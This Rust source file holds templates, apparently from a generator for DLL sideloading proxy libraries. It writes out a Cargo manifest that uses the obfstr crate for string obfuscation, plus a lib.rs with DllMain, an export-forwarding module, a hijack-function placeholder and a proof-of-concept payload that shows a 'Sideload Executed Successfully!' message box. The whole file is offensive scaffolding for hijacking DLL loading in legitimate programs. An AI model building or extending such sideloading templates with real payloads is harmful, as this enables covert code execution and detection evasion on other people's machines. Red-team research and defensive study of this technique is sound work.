pub const CARGO_TOML_TEMPLATE: &str = r#"
[package]
name = "{PACKAGE_NAME}"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
obfstr = "0.4"

[dependencies.windows-sys]
version = "0.61"
features = [
    "Win32_Foundation",
    "Win32_System_SystemServices",
    "Win32_UI_WindowsAndMessaging",
]
"#;

// MessageBoxA + explicit \0. obfstr is UTF-8 and not NUL-terminated.
pub const LIB_RS_TEMPLATE: &str = r#"
#![allow(non_snake_case)]

use std::ffi::c_void;
use std::ptr::null_mut;
use obfstr::obfstr as s;
use windows_sys::core::BOOL;
use windows_sys::Win32::System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};
use windows_sys::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};

mod forward;

#[no_mangle]
unsafe extern "system" fn DllMain(
    _hinst: *mut c_void,
    reason: u32,
    _reserved: *mut c_void,
) -> BOOL {
    match reason {
        DLL_PROCESS_ATTACH | DLL_PROCESS_DETACH => 1,
        _ => 1,
    }
}

fn payload_execution() {
    unsafe {
        MessageBoxA(
            null_mut(),
            s!("Sideload Executed Successfully!\0").as_ptr(),
            s!("Success\0").as_ptr(),
            MB_OK,
        );
    }
}

{HIJACK_FUNCTION}
"#;
